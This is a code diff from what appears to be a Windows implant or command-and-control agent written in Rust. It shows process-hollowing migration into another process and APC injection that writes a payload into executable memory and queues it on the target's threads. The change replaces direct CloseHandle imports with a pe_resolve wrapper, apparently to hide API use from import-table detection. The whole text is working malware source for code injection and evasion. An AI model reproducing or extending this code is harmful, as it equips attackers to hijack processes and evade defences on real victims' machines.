@@ -831,7 +831,6 @@ fn build_macos_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
 
 #[cfg(windows)]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
-    use winapi::um::handleapi::CloseHandle;
     use winapi::um::processthreadsapi::OpenProcess;
     use winapi::um::winnt::{
         PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
@@ -854,7 +853,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     }
 
     let result = hollowing::inject_into_process(target_pid, &payload);
-    unsafe { CloseHandle(process) };
+    unsafe { pe_resolve::close_handle(process) };
     result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
     tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
     Ok(())
@@ -941,7 +940,6 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::handleapi::CloseHandle;
     use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
     use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
     use winapi::um::tlhelp32::{
@@ -970,7 +968,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             PAGE_EXECUTE_READWRITE,
         );
         if remote_mem.is_null() {
-            CloseHandle(hprocess);
+            pe_resolve::close_handle(hprocess);
             return Err(anyhow::anyhow!(
                 "apc_inject: VirtualAllocEx(pid={}) failed",
                 pid
@@ -986,13 +984,13 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             &mut written,
         ) == 0
         {
-            CloseHandle(hprocess);
+            pe_resolve::close_handle(hprocess);
             return Err(anyhow::anyhow!(
                 "apc_inject: WriteProcessMemory(pid={}) failed",
                 pid
             ));
         }
-        CloseHandle(hprocess);
+        pe_resolve::close_handle(hprocess);
 
         // Snapshot all threads in the system, filter by owner pid, queue APC.
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
@@ -1015,7 +1013,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
                         if QueueUserAPC(apc_routine, hthread, 0) != 0 {
                             queued += 1;
                         }
-                        CloseHandle(hthread);
+                        pe_resolve::close_handle(hthread);
                     }
                 }
                 if Thread32Next(snapshot, &mut entry) == 0 {
@@ -1023,7 +1021,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
                 }
             }
         }
-        CloseHandle(snapshot);
+        pe_resolve::close_handle(snapshot);
 
         if queued == 0 {
             return Err(anyhow::anyhow!(
